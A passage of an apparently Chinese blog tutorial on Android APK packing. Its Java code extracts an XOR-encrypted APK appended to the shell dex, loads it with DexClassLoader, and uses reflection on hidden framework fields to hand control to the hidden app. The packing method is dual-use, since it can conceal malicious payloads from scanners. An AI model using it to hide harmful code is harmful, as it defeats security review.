class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String appkey = <span class="string">"APPLICATION_CLASS_NAME"</span>;</span><br><span class="line">    <span class="keyword">private</span> String apkFileName;</span><br><span class="line">    <span class="keyword">private</span> String libPath;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//attachBaseContext执行在onCreate前，重写它来加载源apk</span></span><br><span class="line">    <span class="meta">@RequiresApi</span>(api = Build.VERSION_CODES.KITKAT)</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">attachBaseContext</span><span class="params">(Context base)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.attachBaseContext(base);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File odex = <span class="keyword">this</span>.getDir(<span class="string">"payload_odex"</span>, MODE_PRIVATE);</span><br><span class="line">            File libs = <span class="keyword">this</span>.getDir(<span class="string">"payload_lib"</span>, MODE_PRIVATE);</span><br><span class="line">            String odexPath = odex.getAbsolutePath();</span><br><span class="line">            libPath = libs.getAbsolutePath();</span><br><span class="line">            apkFileName = odex.getAbsolutePath() + <span class="string">"/payload.apk"</span>;</span><br><span class="line">            File dexFile = <span class="keyword">new</span> File(apkFileName);</span><br><span class="line">            Log.i(<span class="string">"demo"</span>, <span class="string">"apk size:"</span>+dexFile.length());</span><br><span class="line">            <span class="keyword">if</span> (!dexFile.exists()) &#123;</span><br><span class="line">                dexFile.createNewFile();</span><br><span class="line">                <span class="keyword">byte</span>[] dexdata = <span class="keyword">this</span>.readDexFileFromApk();</span><br><span class="line">                <span class="keyword">this</span>.splitPayLoadFromDex(dexdata);</span><br><span class="line">            &#125;</span><br><span class="line">            Object currentActivityThread = RefInvoke.invokeStaticMethod(</span><br><span class="line">                    <span class="string">"android.app.ActivityThread"</span>, <span class="string">"currentActivityThread"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123;&#125;, <span class="keyword">new</span> Object[] &#123;&#125;);</span><br><span class="line">            String packageName = <span class="keyword">this</span>.getPackageName();</span><br><span class="line">            ArrayMap mPackages = (ArrayMap) RefInvoke.getFieldOjbect(</span><br><span class="line">                    <span class="string">"android.app.ActivityThread"</span>, currentActivityThread,</span><br><span class="line">                    <span class="string">"mPackages"</span>);</span><br><span class="line">            <span class="keyword">assert</span> mPackages != <span class="keyword">null</span>;</span><br><span class="line">            WeakReference wr = (WeakReference) mPackages.get(packageName);</span><br><span class="line">            <span class="keyword">assert</span> wr != <span class="keyword">null</span>;</span><br><span class="line">            DexClassLoader dLoader = <span class="keyword">new</span> DexClassLoader(apkFileName, odexPath,</span><br><span class="line">                    libPath, (ClassLoader) RefInvoke.getFieldOjbect(</span><br><span class="line">                    <span class="string">"android.app.LoadedApk"</span>, wr.get(), <span class="string">"mClassLoader"</span>));</span><br><span class="line">            RefInvoke.setFieldObject(<span class="string">"android.app.LoadedApk"</span>, <span class="string">"mClassLoader"</span>,</span><br><span class="line">                    wr.get(), dLoader);</span><br><span class="line">            Log.i(<span class="string">"demo"</span>,<span class="string">"classloader:"</span>+dLoader);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Object actObj = dLoader.loadClass(<span class="string">"com.ssj.crackeme.forceapkobj.MainActivity"</span>);</span><br><span class="line">                Log.i(<span class="string">"demo"</span>, <span class="string">"actObj:"</span>+actObj);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                Log.i(<span class="string">"demo"</span>, <span class="string">"activity:"</span>+Log.getStackTraceString(e));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.i(<span class="string">"demo"</span>, <span class="string">"error:"</span>+Log.getStackTraceString(e));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequiresApi</span>(api = Build.VERSION_CODES.KITKAT)</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        loadResources(apkFileName);</span><br><span class="line">        Log.i(<span class="string">"demo"</span>, <span class="string">"onCreate"</span>);</span><br><span class="line"></span><br><span class="line">        String appClassName = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ApplicationInfo ai = <span class="keyword">this</span>.getPackageManager()</span><br><span class="line">                    .getApplicationInfo(<span class="keyword">this</span>.getPackageName(), PackageManager.GET_META_DATA);</span><br><span class="line">            Bundle bundle = ai.metaData;</span><br><span class="line">            <span class="keyword">if</span> (bundle != <span class="keyword">null</span> &amp;&amp; bundle.containsKey(appkey)) &#123;</span><br><span class="line">                appClassName = bundle.getString(appkey);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Log.i(<span class="string">"demo"</span>, <span class="string">"have no application class name"</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NameNotFoundException e) &#123;</span><br><span class="line">            Log.i(<span class="string">"demo"</span>, <span class="string">"error:"</span> + Log.getStackTraceString(e));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object currentActivityThread = RefInvoke.invokeStaticMethod(</span><br><span class="line">                <span class="string">"android.app.ActivityThread"</span>, <span class="string">"currentActivityThread"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        Object mBoundApplication = RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">"android.app.ActivityThread"</span>, currentActivityThread,</span><br><span class="line">                <span class="string">"mBoundApplication"</span>);</span><br><span class="line">        Object loadedApkInfo = RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">"android.app.ActivityThread$AppBindData"</span>,</span><br><span class="line">                mBoundApplication, <span class="string">"info"</span>);</span><br><span class="line"></span><br><span class="line">        RefInvoke.setFieldObject(<span class="string">"android.app.LoadedApk"</span>, <span class="string">"mApplication"</span>,</span><br><span class="line">                loadedApkInfo, <span class="keyword">null</span>);</span><br><span class="line">        Object oldApplication = RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">"android.app.ActivityThread"</span>, currentActivityThread,</span><br><span class="line">                <span class="string">"mInitialApplication"</span>);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Application&gt; mAllApplications = (ArrayList&lt;Application&gt;) RefInvoke</span><br><span class="line">                .getFieldOjbect(<span class="string">"android.app.ActivityThread"</span>,</span><br><span class="line">                        currentActivityThread, <span class="string">"mAllApplications"</span>);</span><br><span class="line">        <span class="keyword">assert</span> mAllApplications != <span class="keyword">null</span>;</span><br><span class="line">        mAllApplications.remove(oldApplication);</span><br><span class="line">        ApplicationInfo appinfo_In_LoadedApk = (ApplicationInfo) RefInvoke</span><br><span class="line">                .getFieldOjbect(<span class="string">"android.app.LoadedApk"</span>, loadedApkInfo,</span><br><span class="line">                        <span class="string">"mApplicationInfo"</span>);</span><br><span class="line">        ApplicationInfo appinfo_In_AppBindData = (ApplicationInfo) RefInvoke</span><br><span class="line">                .getFieldOjbect(<span class="string">"android.app.ActivityThread$AppBindData"</span>,</span><br><span class="line">                        mBoundApplication, <span class="string">"appInfo"</span>);</span><br><span class="line">        <span class="keyword">assert</span> appinfo_In_LoadedApk != <span class="keyword">null</span>;</span><br><span class="line">        appinfo_In_LoadedApk.className = appClassName;</span><br><span class="line">        <span class="keyword">assert</span> appinfo_In_AppBindData != <span class="keyword">null</span>;</span><br><span class="line">        appinfo_In_AppBindData.className = appClassName;</span><br><span class="line">        Application app = (Application) RefInvoke.invokeMethod(</span><br><span class="line">                <span class="string">"android.app.LoadedApk"</span>, <span class="string">"makeApplication"</span>, loadedApkInfo,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;<span class="keyword">boolean</span>.class, Instrumentation.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">false</span>, <span class="keyword">null</span>&#125;);</span><br><span class="line">        RefInvoke.setFieldObject(<span class="string">"android.app.ActivityThread"</span>,</span><br><span class="line">                <span class="string">"mInitialApplication"</span>, currentActivityThread, app);</span><br><span class="line">        ArrayMap mProviderMap = (ArrayMap) RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">"android.app.ActivityThread"</span>, currentActivityThread,</span><br><span class="line">                <span class="string">"mProviderMap"</span>);</span><br><span class="line">        <span class="keyword">assert</span> mProviderMap != <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Object providerClientRecord : mProviderMap.values()) &#123;</span><br><span class="line">            Object localProvider = RefInvoke.getFieldOjbect(</span><br><span class="line">                    <span class="string">"android.app.ActivityThread$ProviderClientRecord"</span>,</span><br><span class="line">                    providerClientRecord, <span class="string">"mLocalProvider"</span>);</span><br><span class="line">            RefInvoke.setFieldObject(<span class="string">"android.content.ContentProvider"</span>,</span><br><span class="line">                    <span class="string">"mContext"</span>, localProvider, app);</span><br><span class="line">        &#125;</span><br><span class="line">        Log.i(<span class="string">"demo"</span>, <span class="string">"app:"</span> + app);</span><br><span class="line">        <span class="keyword">assert</span> app != <span class="keyword">null</span>;</span><br><span class="line">        app.onCreate();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">splitPayLoadFromDex</span><span class="params">(<span class="keyword">byte</span>[] apkdata)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ablen = apkdata.length;</span><br><span class="line">        <span class="keyword">byte</span>[] dexlen = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">        System.arraycopy(apkdata, ablen - <span class="number">4</span>, dexlen, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(dexlen);</span><br><span class="line">        DataInputStream in = <span class="keyword">new</span> DataInputStream(bais);</span><br><span class="line">        <span class="keyword">int</span> readInt = in.readInt();</span><br><span class="line">        System.out.println(Integer.toHexString(readInt));</span><br><span class="line">        <span class="keyword">byte</span>[] newdex = <span class="keyword">new</span> <span class="keyword">byte</span>[readInt];</span><br><span class="line">        System.arraycopy(apkdata, ablen - <span class="number">4</span> - readInt, newdex, <span class="number">0</span>, readInt);</span><br><span class="line">        newdex = decrypt(newdex);</span><br><span class="line">        File file = <span class="keyword">new</span> File(apkFileName);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream localFileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            localFileOutputStream.write(newdex);</span><br><span class="line">            localFileOutputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException localIOException) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(localIOException);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ZipInputStream localZipInputStream = <span class="keyword">new</span> ZipInputStream(</span><br><span class="line">                <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(file)));</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            ZipEntry localZipEntry = localZipInputStream.getNextEntry();</span><br><span class="line">            <span class="keyword">if</span> (localZipEntry == <span class="keyword">null</span>) &#123;</span><br><span class="line">                localZipInputStream.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String name = localZipEntry.getName();</span><br><span class="line">            <span class="keyword">if</span> (name.startsWith(<span class="string">"lib/"</span>) &amp;&amp; name.endsWith(<span class="string">".so"</span>)) &#123;</span><br><span class="line">                File storeFile = <span class="keyword">new</span> File(libPath + <span class="string">"/"</span></span><br><span class="line">                        + name.substring(name.lastIndexOf(<span class="string">'/'</span>)));</span><br><span class="line">                storeFile.createNewFile();</span><br><span class="line">                FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(storeFile);</span><br><span class="line">                <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> i = localZipInputStream.read(arrayOfByte);</span><br><span class="line">                    <span class="keyword">if</span> (i == -<span class="number">1</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    fos.write(arrayOfByte, <span class="number">0</span>, i);</span><br><span class="line">                &#125;</span><br><span class="line">                fos.flush();</span><br><span class="line">                fos.close();</span><br><span class="line">            &#125;</span><br><span class="line">            localZipInputStream.closeEntry();</span><br><span class="line">        &#125;</span><br><span class="line">        localZipInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] readDexFileFromApk() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream dexByteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ZipInputStream localZipInputStream = <span class="keyword">new</span> ZipInputStream(</span><br><span class="line">                <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(</span><br><span class="line">                        <span class="keyword">this</span>.getApplicationInfo().sourceDir)));</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            ZipEntry localZipEntry = localZipInputStream.getNextEntry();</span><br><span class="line">            <span class="keyword">if</span> (localZipEntry == <span class="keyword">null</span>) &#123;</span><br><span class="line">                localZipInputStream.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (localZipEntry.getName().equals(<span class="string">"classes.dex"</span>)) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> i = localZipInputStream.read(arrayOfByte);</span><br><span class="line">                    <span class="keyword">if</span> (i == -<span class="number">1</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    dexByteArrayOutputStream.write(arrayOfByte, <span class="number">0</span>, i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            localZipInputStream.closeEntry();</span><br><span class="line">        &#125;</span><br><span class="line">        localZipInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> dexByteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] srcdata) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;srcdata.length;i++)&#123;</span><br><span class="line">            srcdata[i] = (<span class="keyword">byte</span>)(<span class="number">0xFF</span> ^ srcdata[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> srcdata;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> AssetManager mAssetManager;</span><br><span class="line">    <span class="keyword">protected</span> Resources mResources;</span><br><span class="line">    <span class="keyword">protected</span> Theme mTheme;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">loadResources</span><span class="params">(String dexPath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AssetManager assetManager = AssetManager.class.newInstance();</span><br><span class="line">            Method addAssetPath = assetManager.getClass().getMethod(<span class="string">"addAssetPath"</span>, String.class);</span><br><span class="line">            addAssetPath.invoke(assetManager, dexPath);</span><br><span class="line">            mAssetManager = assetManager;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.i(<span class="string">"inject"</span>, <span class="string">"loadResource error:"</span>+Log.getStackTraceString(e));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Resources superRes = <span class="keyword">super</span>.getResources();</span><br><span class="line">        superRes.getDisplayMetrics();</span><br><span class="line">        superRes.getConfiguration();</span><br><span class="line">        mResources = <span class="keyword">new</span> Resources(mAssetManager, superRes.getDisplayMetrics(),superRes.getConfiguration());</span><br><span class="line">        mTheme = mResources.newTheme();</span><br><span class="line">        mTheme.setTo(<span class="keyword">super</span>.getTheme());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AssetManager <span class="title">getAssets</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mAssetManager == <span class="keyword">null</span> ? <span class="keyword">super</span>.getAssets() : mAssetManager;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Resources <span class="title">getResources</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mResources == <span class="keyword">null</span> ? <span class="keyword">super</span>.getResources() : mResources;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Theme <span class="title">getTheme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mTheme == <span class="keyword">null</span> ? <span class="keyword">super</span>.getTheme() : mTheme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RefInvoke</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> Object <span class="title">invokeStaticMethod</span><span class="params">(String class_name, String method_name, Class[] pareTyple, Object[] pareVaules)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class obj_class = Class.forName(class_name);</span><br><span class="line">            Method method = obj_class.getDeclaredMethod(method_name, pareTyple);</span><br><span class="line">            method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(<span class="keyword">null</span>, pareVaules);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> Object <span class="title">invokeMethod</span><span class="params">(String class_name, String method_name, Object obj, Class[] pareTyple, Object[] pareVaules)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class obj_class = Class.forName(class_name);</span><br><span class="line">            Method method = obj_class.getDeclaredMethod(method_name, pareTyple);</span><br><span class="line">            method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(obj, pareVaules);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> Object <span class="title">getFieldOjbect</span><span class="params">(String class_name, Object obj, String filedName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class obj_class = Class.forName(class_name);</span><br><span class="line">            Field field = obj_class.getDeclaredField(filedName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldObject</span><span class="params">(String classname, String filedName, Object obj, Object filedVaule)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class obj_class = Class.forName(classname);</span><br><span class="line">            Field field = obj_class.getDeclaredField(filedName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(obj, filedVaule);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里要注意的是，manifest里的入口activity要写那个源apk的入口activity。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta-data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"APPLICATION_CLASS_NAME"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"com.xxx.xxx.MyApplication"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"com.xxx.xxx.MainActivity"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="加密-拼装工具"><a href="#加密-拼装工具" class="headerlink" title="加密+拼装工具"></a>加密+拼装工具</h4><p>这个就是把源apk和壳的dex拼在一起，并加密，变成新的壳的dex，并修正dex头中<strong>checksum</strong>、<strong>signature</strong>、<strong>file_size</strong>的值。</p>
<p>新dex结构：</p>
<table>
<thead>
<tr>
<th style="text-align:center">dex</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">checksum</td>
</tr>
<tr>
<td style="text-align:center">signature</td>
</tr>
<tr>
<td style="text-align:center">file_size</td>
</tr>
<tr>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">壳的dex</td>
</tr>
<tr>
<td style="text-align:center">源程序的apk</td>
</tr>
<tr>
<td style="text-align:center">源程序apk的大小</td>
</tr>
</tbody>
</table>
